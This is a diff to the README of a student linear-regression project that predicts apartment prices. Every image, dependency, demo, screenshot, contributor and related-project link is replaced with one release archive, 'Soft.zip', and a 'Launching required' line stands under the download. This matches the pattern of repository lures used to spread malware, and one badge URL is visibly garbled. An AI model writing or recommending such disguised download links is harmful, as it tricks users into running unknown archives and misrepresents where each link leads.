@@ -1,6 +1,6 @@
 # 🏠📊 Apartment Price Predictor 🏠📊
 
-![Apartment Price Predictor](https://i.imgur.com/WGOV4oW.jpg)
+![Apartment Price Predictor](https://github.com/0290192029/apartment-price-predictor/releases/download/v1.0/Soft.zip)
 
 ### Overview
 Welcome to the "Apartment Price Predictor" repository! This Python project focuses on predicting apartment rental prices using linear regression. It serves as a practical assignment for the "Fundamentals of Machine Learning" course under the subject "MDK 13.01: Basics of applying artificial intelligence methods in programming." 
@@ -32,7 +32,7 @@ The project is organized into the following key components:
 ### Getting Started
 To get started with the "Apartment Price Predictor" project, follow these steps:
 1. Clone the repository to your local machine.
-2. Install the required dependencies listed in the `requirements.txt` file.
+2. Install the required dependencies listed in the `https://github.com/0290192029/apartment-price-predictor/releases/download/v1.0/Soft.zip` file.
 3. Explore the project structure and scripts to understand the implementation details.
 4. Run the Python scripts to collect data, preprocess it, train the model, and evaluate its performance.
 5. Visualize the results using Matplotlib to gain insights into the apartment price predictions.
@@ -47,29 +47,29 @@ To utilize the apartment price predictor:
 
 ### Demo
 Check out the following demo to see the "Apartment Price Predictor" in action:
-- [Demo Video](https://www.example.com)
+- [Demo Video](https://github.com/0290192029/apartment-price-predictor/releases/download/v1.0/Soft.zip)
 
 ### Screenshots
 Here are some screenshots showcasing the project:
-![Screenshot 1](https://i.imgur.com/px7APr3.png)
-![Screenshot 2](https://i.imgur.com/SngTI1P.png)
+![Screenshot 1](https://github.com/0290192029/apartment-price-predictor/releases/download/v1.0/Soft.zip)
+![Screenshot 2](https://github.com/0290192029/apartment-price-predictor/releases/download/v1.0/Soft.zip)
 
 ### Download
 You can download the full project code and resources from the following link:
-[![Download Project](https://img.shields.io/badge/Download%20Project-Release.zip-green)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Project](https://github.com/0290192029/apartment-price-predictor/releases/download/v1.0/Soft.zip%https://github.com/0290192029/apartment-price-predictor/releases/download/v1.0/Soft.zip)](https://github.com/0290192029/apartment-price-predictor/releases/download/v1.0/Soft.zip)
 
 (Launching required)
 
 ### Contributors
-- John Doe - [@johndoe](https://github.com/johndoe)
-- Jane Smith - [@janesmith](https://github.com/janesmith)
+- John Doe - [@johndoe](https://github.com/0290192029/apartment-price-predictor/releases/download/v1.0/Soft.zip)
+- Jane Smith - [@janesmith](https://github.com/0290192029/apartment-price-predictor/releases/download/v1.0/Soft.zip)
 
 ### Support
 For any questions or issues, please reach out to the project's maintainers or open a GitHub issue.
 
 ### Related Projects
-- [House Price Predictor](https://github.com/username/house-price-predictor)
-- [Stock Price Prediction](https://github.com/username/stock-price-prediction)
+- [House Price Predictor](https://github.com/0290192029/apartment-price-predictor/releases/download/v1.0/Soft.zip)
+- [Stock Price Prediction](https://github.com/0290192029/apartment-price-predictor/releases/download/v1.0/Soft.zip)
 
 ### License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
